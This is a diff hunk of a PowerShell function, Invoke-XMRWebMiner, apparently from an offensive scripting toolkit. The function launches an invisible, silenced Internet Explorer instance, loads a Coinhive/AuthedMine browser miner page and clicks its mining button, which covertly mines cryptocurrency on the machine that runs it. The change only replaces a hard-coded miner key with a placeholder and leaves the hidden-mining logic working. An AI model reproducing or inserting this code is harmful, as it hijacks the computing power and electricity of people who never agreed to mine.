@@ -3,7 +3,7 @@ function Invoke-XMRWebMiner {
 $ie=New-Object -comobject InternetExplorer.Application
 $ie.visible = $False
 $ie.Silent = $true
-$ie.navigate('https://authedmine.com/media/miner.html?key=hc0bDnCskaupNOIb2cWVZQMPswLeo3Iv#')
+$ie.navigate('https://authedmine.com/media/miner.html?key=<enter your coinhive key>')
 while($ie.busy){Start-Sleep 3}
 $link = @($ie.Document.documentElement.getElementsByClassName(("mining-button")))
 $link.click()
